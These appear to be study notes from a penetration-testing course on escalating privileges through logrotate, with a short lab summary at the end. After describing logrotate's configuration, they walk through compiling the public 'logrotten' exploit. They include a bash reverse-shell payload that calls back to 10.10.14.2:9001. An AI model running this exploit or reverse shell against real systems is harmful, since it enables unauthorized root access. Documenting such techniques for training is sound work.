`Logrotate` has many features for managing these log files. These include the specification of:

- the `size` of the log file,
- its `age`,
- and the `action` to be taken when one of these factors is reached.

```shell
man logrotate
```
```shell
logrotate --help
```

The function of the rotation itself consists in renaming the log files. For example, new log files can be created for each new day, and the older ones will be renamed automatically. Another example of this would be to empty the oldest log file and thus reduce memory consumption.

This tool is usually started periodically via `cron` and controlled via the configuration file `/etc/logrotate.conf`. Within this file, it contains global settings that determine the function of `logrotate`.

```shell
cat /etc/logrotate.conf


# see "man logrotate" for details

# global options do not affect preceding include directives

# rotate log files weekly
weekly

# use the adm group by default, since this is the owning group
# of /var/log/syslog.
su root adm

# keep 4 weeks worth of backlogs
rotate 4

# create new (empty) log files after rotating old ones
create

# use date as a suffix of the rotated file
#dateext

# uncomment this if you want your log files compressed
#compress

# packages drop log rotation information into this directory
include /etc/logrotate.d

# system-specific logs may also be configured here.
```

To force a new rotation on the same day, we can set the date after the individual log files in the status file `/var/lib/logrotate.status` or use the `-f`/`--force` option:
```shell
sudo cat /var/lib/logrotate.status
```

We can find the corresponding configuration files in `/etc/logrotate.d/` directory.
```shell
ls /etc/logrotate.d/
```

```shell
cat /etc/logrotate.d/dpkg
```

To exploit `logrotate`, we need some requirements that we have to fulfill.

1. we need `write` permissions on the log files
2. logrotate must run as a privileged user or `root`
3. vulnerable versions:
    - 3.8.6
    - 3.11.0
    - 3.15.0
    - 3.18.0

There is a prefabricated exploit that we can use for this if the requirements are met. This exploit is named [logrotten](https://github.com/whotwagner/logrotten). We can download and compile it on a similar kernel of the target system and then transfer it to the target system. Alternatively, if we can compile the code on the target system, then we can do it directly on the target system.

```shell
git clone https://github.com/whotwagner/logrotten.git
```

```shell
cd logrotten
```

```shell
gcc logrotten.c -o logrotten
```

```shell
echo 'bash -i >& /dev/tcp/10.10.14.2/9001 0>&1' > payload
```

However, before running the exploit, we need to determine which option `logrotate` uses in `logrotate.conf`
```shell
grep "create\|compress" /etc/logrotate.conf | grep -v "#"

create
```

```shell
./logrotten -p ./payload /tmp/tmp.log
```

## Lab

/backups contains access.log and access.log1

start log rotate for access.log
when we write to access.log...log rotate is called and it writes another log there

then we need to wait for root to login which is set up as a cron locally after that we get flag

### References

- [logrotten Github](https://github.com/whotwagner/logrotten)


### Extra Learnings

- Watch command
- last | head --> Last logins